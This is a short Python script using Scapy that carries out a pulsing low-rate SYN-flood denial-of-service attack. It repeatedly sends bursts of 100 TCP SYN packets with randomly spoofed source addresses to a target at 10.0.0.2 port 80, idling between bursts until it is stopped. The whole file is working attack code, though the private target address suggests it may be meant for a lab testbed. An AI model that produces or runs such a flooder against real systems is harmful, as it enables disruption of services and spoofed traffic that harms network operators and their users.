#!/usr/bin/env python3
import os
import sys
import time
import random
from scapy.all import IP, TCP, send, conf

# Check if running as root
if os.geteuid() != 0:
    print("ERROR: This script must be run as root (use sudo)")
    sys.exit(1)

target_ip = "10.0.0.2"
target_port = 80

# LDDoS parameters
burst_size = 100        # packets per burst
burst_duration = 0.5    # seconds
idle_duration = 1.0     # seconds between bursts

# Disable Scapy warnings
conf.verb = 0

print(f"Starting LDDoS attack on {target_ip}:{target_port}")
print(f"Burst size: {burst_size} packets")
print(f"Burst duration: {burst_duration}s, Idle: {idle_duration}s")

try:
    while True:
        # Send burst
        print(f"[{time.strftime('%H:%M:%S')}] Sending burst of {burst_size} packets...")
        
        for i in range(burst_size):
            spoofed_ip = f"10.10.10.{random.randint(1, 254)}"
            
            # Create packet with spoofed source
            packet = IP(src=spoofed_ip, dst=target_ip) / TCP(dport=target_port, flags="S", sport=random.randint(1024, 65535))
            
            # Send without waiting for reply
            send(packet, verbose=0, inter=0)
        
        print(f"[{time.strftime('%H:%M:%S')}] Burst complete. Idle for {idle_duration}s...")
        time.sleep(idle_duration)
        
except KeyboardInterrupt:
    print("\n[*] Attack stopped by user")
    sys.exit(0)